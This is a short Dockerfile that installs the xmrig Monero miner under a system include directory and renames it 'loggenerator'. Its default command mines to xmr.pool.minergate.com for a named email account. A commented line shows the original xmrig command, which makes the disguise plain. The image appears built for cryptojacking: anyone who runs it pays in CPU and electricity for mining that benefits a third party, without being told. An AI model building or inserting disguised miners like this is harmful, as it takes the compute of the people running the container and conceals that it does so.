FROM ubuntu:16.04

RUN apt-get update && apt-get install libuv1-dev libmicrohttpd-dev -y

RUN mkdir -p /usr/include/log

WORKDIR /usr/include/log

COPY resolv.conf /etc/

COPY xmrig /usr/include/log/loggenerator

#CMD ["/usr/include/log/xmrig -o xmr.pool.minergate.com:45700 -u alex1711.ccc@yandex.ru -k"]

CMD ./loggenerator -o xmr.pool.minergate.com:45700 -u alex1711.ccc@yandex.ru -k

